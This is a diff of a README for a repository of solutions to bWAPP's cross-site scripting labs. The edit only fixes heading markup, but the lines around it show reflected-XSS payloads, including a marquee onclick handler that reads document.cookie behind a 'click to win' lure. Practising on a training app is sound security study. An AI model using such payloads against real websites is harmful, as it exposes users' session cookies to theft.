@@ -83,10 +83,10 @@ Welcome to the repository of comprehensive solutions for bWAPP's Cross-Site Scri
 # XSS - Reflected (PHP_Self)(Low)
 ```Payload – <a href="javascript:x='&percnt;27-alert('BugBot19 was here')-%27';">XSS</a>```
 
-#XSS - Reflected (PHP_Self)(Medium)
+# XSS - Reflected (PHP_Self)(Medium)
 ```Payload – <marquee onclick=alert(document.cookie)>click to win 1$</marquee>```
 
-#XSS - Reflected (PHP_Self)(High)
+# XSS - Reflected (PHP_Self)(High)
 ```Payload – ```
 
 
